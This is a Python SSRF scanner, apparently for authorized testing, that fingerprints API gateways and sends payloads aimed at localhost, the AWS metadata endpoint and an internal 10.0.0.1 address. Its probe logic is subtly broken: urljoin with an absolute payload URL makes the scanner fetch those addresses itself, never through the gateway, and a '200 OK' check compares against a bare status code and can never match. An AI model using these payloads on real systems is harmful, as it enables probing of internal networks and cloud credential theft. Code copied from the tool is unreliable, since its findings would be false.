#!/usr/bin/env python3
"""
API Gateway SSRF Vulnerability Scanner
======================================

Scans API gateways to detect and assess potential Server-Side Request Forgery (SSRF) vulnerabilities. 
The scanner attempts to fingerprint the API gateway, extract the version, and if permitted, actively 
probes for SSRF vulnerabilities.

This tool implements safe probing as well as aggressive testing modes for verifying SSRF issues. 
Unauthorized use of this tool is strictly prohibited; it is intended for authorized security researchers!

Vulnerability Overview:
  - Class: Server-Side Request Forgery (SSRF)
  - Affects multiple API gateway technologies that fail to properly validate and sanitize user-supplied URLs.
  - Exploitable by crafting malicious URLs to access internal resources, perform unauthorized network scans, 
    or leak sensitive information.

Commonly Affected API Gateway Vendors:
  - Kong Gateway
  - AWS API Gateway + Lambda
  - Traefik
  - NGINX Ingress Controller for Kubernetes
  - Others that expose HTTP routing and forwarding without proper validation.

Usage:
  # Scan a single API gateway instance
  python api_gateway_ssrf_scanner.py --target http://api.example.com

  # Scan multiple API gateway instances from a file
  python api_gateway_ssrf_scanner.py --list targets.txt --output findings.json

  # Use safe mode (no actual SSRF payloads sent)
  python api_gateway_ssrf_scanner.py --target http://api.example.com --safe
  
  # Custom output file
  python api_gateway_ssrf_scanner.py --list targets.txt --output results.json

References:
  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
  - https://csrc.nist.gov/projects/ssrf
  - https://portswigger.net/web-security/ssrf
"""

import asyncio
import json
import re
import argparse
from urllib.parse import urljoin, urlparse

import httpx
from colorama import Fore, Style

# Configure SSRF test payloads and expected behavior
SSRF_TEST_PAYLOADS = [
    {"description": "Localhost access", "payload": "http://127.0.0.1:80", "expected": "HTTP"},
    {"description": "AWS metadata service", "payload": "http://169.254.169.254/latest/meta-data/", "expected": "200 OK"},
    {"description": "Internal network access", "payload": "http://10.0.0.1", "expected": "HTTP"},
]

# Markers for common API Gateways
API_GATEWAY_FINGERPRINTS = [
    {"name": "Kong Gateway", "keyword": "X-Kong-Proxy-Latency", "version_pattern": r"Kong/([\d\.]+)"},
    {"name": "NGINX", "keyword": "nginx", "version_pattern": r"nginx/([\d\.]+)"},
    {"name": "AWS API Gateway", "keyword": "x-amzn-RequestId", "version_pattern": None},
]

# Set default settings
HTTP_TIMEOUT = 8
SEMAPHORE_LIMIT = 20


# ── Helper Methods ────────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    """Ensure the URL has a proper schema and standard format."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def color_text(text: str, level: str) -> str:
    """Return text with ANSI color codes depending on the severity level."""
    colors = {
        "CRITICAL": Fore.RED + Style.BRIGHT,
        "HIGH": Fore.YELLOW + Style.BRIGHT,
        "INFO": Fore.GREEN + Style.BRIGHT,
        "RESET": Style.RESET_ALL,
    }
    return f"{colors.get(level, '')}{text}{colors['RESET']}"


def parse_version(headers) -> tuple:
    """Extract and parse version from HTTP headers."""
    for fingerprint in API_GATEWAY_FINGERPRINTS:
        if fingerprint["keyword"].lower() in str(headers).lower():
            if fingerprint["version_pattern"]:
                match = re.search(fingerprint["version_pattern"], str(headers))
                if match:
                    return fingerprint["name"], tuple(map(int, match.group(1).split(".")))
            return fingerprint["name"], None
    return None, None


# ── Scanner Logic ─────────────────────────────────────────────────────────────

async def probe_url(client: httpx.AsyncClient, url: str, probe: dict, semaphore: asyncio.Semaphore):
    """Probe a specific URL with an SSRF payload."""
    async with semaphore:
        result = {}
        try:
            full_url = urljoin(url, probe["payload"])
            response = await client.get(full_url, timeout=HTTP_TIMEOUT, follow_redirects=False)
            result["status_code"] = response.status_code
            result["body"] = response.text[:500]
            result["headers"] = dict(response.headers)
        except Exception as e:
            result["error"] = f"Request failed: {str(e)}"
    return result


async def check_ssrf(client: httpx.AsyncClient, target: str, safe: bool) -> dict:
    """Check for SSRF vulnerability on the target API gateway."""
    target = normalize_url(target)
    print(color_text(f"[*] Scanning target: {target}", "INFO"))

    # Detection phase: Identify the API gateway
    try:
        response = await client.get(target, timeout=HTTP_TIMEOUT)
        headers = response.headers
        detected, version = parse_version(headers)
        if detected:
            output = {
                "url": target,
                "gateway_type": detected,
                "version": version,
                "vulnerabilities": []
            }
            print(color_text(f"[INFO] Detected gateway: {detected}, version: {version}", "INFO"))

            if not safe:
                print(color_text(f"[INFO] Probing for SSRF issues...", "INFO"))
                semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)

                for probe in SSRF_TEST_PAYLOADS:
                    probe_result = await probe_url(client, target, probe, semaphore)
                    if probe["expected"] in str(probe_result.get("body", "")) or str(probe_result.get("status_code", "")) == probe["expected"]:
                        output["vulnerabilities"].append({
                            "type": "SSRF",
                            "description": probe["description"],
                            "payload": probe["payload"],
                            "response": probe_result
                        })
                        print(color_text(f"[CRITICAL] SSRF Detected! Payload: {probe['payload']}", "CRITICAL"))
                    else:
                        print(color_text(f"[HIGH] Tested {probe['description']}: No vulnerability detected.", "HIGH"))
        else:
            print(color_text(f"[INFO] No API Gateway detected on {target}", "INFO"))
            return None

        return output
    except Exception as e:
        print(color_text(f"[ERROR] Failed to scan {target}: {str(e)}", "CRITICAL"))
        return None


async def main(args):
    """Main function to run the scanner."""
    tasks = []
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        if args.target:
            tasks.append(check_ssrf(client, args.target, safe=args.safe))
        elif args.list:
            with open(args.list, "r") as f:
                for line in f:
                    target = line.strip()
                    if target:
                        tasks.append(check_ssrf(client, target, safe=args.safe))

        results = await asyncio.gather(*tasks)
        filtered = [r for r in results if r]  # Exclude None

        if args.output:
            with open(args.output, "w") as f:
                json.dump(filtered, f, indent=2)
                print(color_text(f"[INFO] Results saved to {args.output}", "INFO"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="API Gateway SSRF Vulnerability Scanner")
    parser.add_argument("--target", help="Single target URL to scan.")
    parser.add_argument("--list", help="File containing a list of target URLs to scan.")
    parser.add_argument("--output", help="Save results to a JSON file.")
    parser.add_argument("--safe", action="store_true", help="Safe mode: detection only without probes.")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent HTTP requests (default: 10).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification for HTTPS requests.")

    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("You must specify either --target or --list.")
    asyncio.run(main(args))
